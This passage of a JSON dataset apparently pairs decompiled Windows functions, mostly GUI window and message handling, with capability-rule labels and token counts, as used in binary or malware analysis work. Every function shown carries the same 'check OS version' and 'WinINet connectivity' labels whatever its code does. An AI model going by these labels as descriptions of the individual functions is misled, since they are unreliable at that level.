        "decompiled_code": "\nvoid __fastcall fcn.004416a4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x8f) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        fcn.004585f8();\n        iVar1 = fcn.0043b75c();\n        if (iVar1 == 0) {\n            uVar2 = fcn.004585f8(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar2);\n            uVar2 = fcn.004585f8(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar2);\n            if (*(in_EAX + 0x276) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.00450fd0();\n            return;\n        }\n    }\n    fcn.00452518();\n    return;\n}\n",
        "token_count": 282
    },
    "0044191c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044191c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4419b7;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.00437a24();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.004470d4();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0044d5a8();\n            fcn.004470d4();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x4419be;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 445
    },
    "00441ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00441ccc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00441d38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00441d38(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x441ea2;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.0044d2f4(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.00441ccc();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x00441e8c;\n            fcn.00441d04(&fcn.00441d38::var_8h);\n            fcn.00418420();\n            fcn.00450324();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.00441c8c(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.00441c8c(&stack0xfffffffc);\n            }\n            fcn.00418420();\n            fcn.00450324();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.00446d0c();\n            }\n            else if (var_dh == '\\0') {\n                fcn.00446c7c();\n            }\n        }\n        else {\n            fcn.00446d94();\n            fcn.00446d94();\n        }\n    }\ncode_r0x00441e8c:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x441ea9;\n    uStack72 = 0x441ea1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 644
    },
    "00441f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441f50(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if ((((*(in_EAX + 0xd2) != '\\0') && ((in_EAX[0xc] == 0 || ((*(in_EAX + 7) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == in_EAX[0x12] && (*(*(param_2 + 8) + 0x14) == in_EAX[0x13])))) {\n        fcn.0043f5f4();\n        fcn.00443b04();\n        fcn.0043f5f4();\n        fcn.00443b04();\n        fcn.00441f24(arg_8h);\n        fcn.0043f5f4();\n        fcn.00443b04();\n        fcn.00441f24(arg_8h_00);\n        fcn.00441f24(&stack0xfffffffc);\n        fcn.00441f24(&stack0xfffffffc);\n    }\n    fcn.004569f4();\n    iVar2 = fcn.00447e3c();\n    cVar1 = fcn.00448128();\n    if (((cVar1 != '\\0') && (*(iVar2 + 0x28) == '\\0')) && (*(var_4h + 0x57) != '\\0')) {\n        iVar3 = *(param_2 + 8);\n        if ((*(iVar3 + 0x10) != 0) || (*(iVar3 + 0x14) != 0)) {\n            iVar5 = *(iVar3 + 0x10) - var_4h[0x12];\n            iVar3 = *(iVar3 + 0x14) - var_4h[0x13];\n            if ((iVar5 != 0) || (iVar3 != 0)) {\n                (**(*var_4h + 0x44))();\n                fcn.00418448(&var_24h, var_8h - *(iVar2 + 0x18));\n                if ((*(iVar2 + 0x10) < var_18h) || (iVar3 < 1)) {\n                    if (0 < iVar3) {\n                        var_18h = var_18h + iVar3;\n                    }\n                    if (var_18h < var_20h) {\n                        var_18h = var_20h;\n                    }\n                }\n                else {\n                    var_18h = var_20h - iVar3;\n                    var_20h = *(iVar2 + 0x18);\n                    *(var_4h[0xa9] + 8) = 1;\n                }\n                iVar2 = *(iVar2 + 0xc);\n                if ((var_1ch < iVar2) && (0 < iVar5)) {\n                    var_24h = var_1ch - iVar5;\n                    *(var_4h[0xa9] + 8) = 1;\n                    var_1ch = iVar2;\n                }\n                else {\n                    if (0 < iVar5) {\n                        var_1ch = var_1ch + iVar5;\n                    }\n                    if (var_1ch < var_24h) {\n                        var_1ch = var_24h;\n                    }\n                }\n                uVar4 = fcn.004585f8(&var_24h, 0);\n                sub.user32.dll_InvalidateRect(uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1019
    },
    "00442280": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442280(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x4428dc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x4422c1;\n        fcn.00407550();\n        puStack40 = 0x4422d0;\n        fcn.0040dafc();\n        puStack40 = 0x4422d5;\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x4422df;\n    fcn.004471c4();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x4428bf;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x442791;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x499c20 + 0x6c) == in_EAX) {\n                puStack52 = 0x4427bf;\n                fcn.00440fd0();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x4427d6;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x442813;\n                iVar3 = fcn.004585f8();\n                puStack52 = 0x44281a;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x442826;\n                    fcn.004585f8();\n                    puStack52 = 0x44282b;\n                    iVar3 = fcn.0043b75c();\n                    if (iVar3 == 0) {\n                        puStack52 = 0x442837;\n                        fcn.004585f8();\n                        puStack52 = 0x44283c;\n                        iVar7 = fcn.0043ba80();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x442871;\n                    iStack56 = fcn.004585f8();\n                    uStack60 = 0x442877;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.004585f8(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    sub.user32.dll_SetActiveWindow(iVar7);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.004585f8(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x442338;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x442394;\n                    iVar3 = fcn.00450210();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4423b0;\n                    iVar3 = fcn.00450254();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4423cb;\n                    iVar3 = fcn.00443d84();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4423e4;\n                    iVar3 = fcn.00443d78();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x4423fd;\n                iVar3 = fcn.00443d9c();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x44240b;\n                    fcn.00443d9c();\n                }\n                puStack52 = 0x442417;\n                iVar3 = fcn.00443d90();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x442425;\n                    fcn.00443d90();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x442444;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x442459;\n                    fcn.0043fdf4();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x499c1c + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x44249b;\n                    cVar2 = fcn.004047dc();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x4424eb;\n                    iVar3 = fcn.00443d84();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442504;\n                    iVar3 = fcn.00443d78();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4424b0;\n                    iVar6 = fcn.0043df9c();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x4424cb;\n                    iVar7 = fcn.0043dfbc();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x44251d;\n                iVar3 = fcn.00443d9c();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x44252b;\n                    fcn.00443d9c();\n                }\n                puStack52 = 0x442537;\n                iVar3 = fcn.00443d90();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x442545;\n                    fcn.00443d90();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x442564;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x442579;\n                    fcn.0043fdf4();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x44259f;\n                    iVar3 = fcn.00450210();\n                    iVar7 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4425bb;\n                    iVar3 = fcn.00450254();\n                    iVar8 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4425d6;\n                    uVar4 = fcn.00443db4();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x4425e9;\n                    iVar6 = fcn.00443d9c();\n                    iVar7 = in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((in_EAX[0x12] & 1U) != 0);\n                    }\n                    iVar7 = (iVar3 + iVar6) - iVar7;\n                    puStack52 = 0x442604;\n                    uVar4 = fcn.00443da8();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x442617;\n                    iVar6 = fcn.00443d90();\n                    iVar8 = in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((in_EAX[0x13] & 1U) != 0);\n                    }\n                    iVar8 = (iVar3 + iVar6) - iVar8;\n                }\n                puStack52 = 0x442632;\n                iVar3 = fcn.00443d9c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x442640;\n                    fcn.00443d9c();\n                }\n                puStack52 = 0x44264c;\n                iVar3 = fcn.00443d90();\n                if (iVar8 < iVar3) {\n                    puStack52 = 0x44265a;\n                    fcn.00443d90();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x442679;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x4426a9;\n                    iStack56 = fcn.004585f8();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x499c1c + 0x44) + 0x29c));\n                    uVar5 = fcn.004585f8(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49258c);\n                    iStack56 = 0x4426ef;\n                    iStack56 = fcn.004585f8();\n                    uStack60 = 0x4426f5;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.004585f8(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x407ff8, uVar5);\n                    fcn.00450af8();\n                }\n                iStack56 = *(*(*0x499c1c + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49258c);\n                iStack56 = 0x442762;\n                iStack56 = fcn.004585f8();\n                uStack60 = 0x442768;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x4428a1;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.004585f8();\n        uStack60 = 0x4428a7;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3704
    },
    "0044296c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044296c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x442998;\n            fcn.00424528();\n            uStack20 = 0x4429ca;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x4429d1;\n            uStack20 = 0x4429c9;\n            fcn.00404650();\n            return;\n        }\n        puStack16 = 0x44298a;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "00442a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442a04(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.0040484c();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x499c1c + 0x44)) {\n                    fcn.00446734();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00442ba4();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0043fdb4();\n                }\n                else {\n                    fcn.00442c80();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "00442bc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442bc4(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x442c43;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x00442c2d;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x00442bf4:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.00458904();\n            if (cVar2 != '\\0') goto code_r0x00442c26;\n        }\n        fcn.00407550();\n        fcn.0040dafc();\n        fcn.00404ec4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x00442bf4;\n    }\ncode_r0x00442c26:\n    fcn.00440ea4();\ncode_r0x00442c2d:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x442c4a;\n    uStack20 = 0x442c42;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 397
    },
    "00442c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442c9c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x442f8e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x442cbf;\n    fcn.0044edc0();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x442cd0;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x00442d0d;\n    }\n    puStack60 = 0x442cf9;\n    fcn.00407550();\n    puStack60 = 0x442d08;\n    fcn.0040dafc();\n    puStack60 = 0x442d0d;\n    fcn.00404ec4();\ncode_r0x00442d0d:\n    puStack60 = 0x442d12;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x442d21;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x442d27;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x442d2c;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x442d36;\n    fcn.004453d8();\n    uStack64 = 0x442f71;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x499c1c + 0xd4) != '\\0')) {\n        puStack72 = 0x442d70;\n        puStack60 = &stack0xfffffffc;\n        fcn.00454ff0();\n        puStack72 = 0x442d78;\n        fcn.004585d4();\n    }\n    puStack72 = 0x442d7d;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x442d85;\n    fcn.0043b77c();\n    puStack72 = 0x442d9f;\n    fcn.00419914();\n    *(*0x499c20 + 0x78) = in_EAX;\n    puStack72 = 0x442dc3;\n    fcn.004442a8();\n    puStack72 = 0x442dd5;\n    fcn.0043b920();\n    uStack76 = 0x442f4f;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x442dee;\n    puStack72 = &stack0xfffffffc;\n    fcn.00442bac();\n    uStack88 = 0x442eae;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.004585f8(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.00446638();\n        if (*(*0x499c1c + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.00442b0c();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.004585f8(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.004585f8();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.00442ba4(0x442eb5);\n    return;\n}\n",
        "token_count": 1200
    },
    "00442fa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
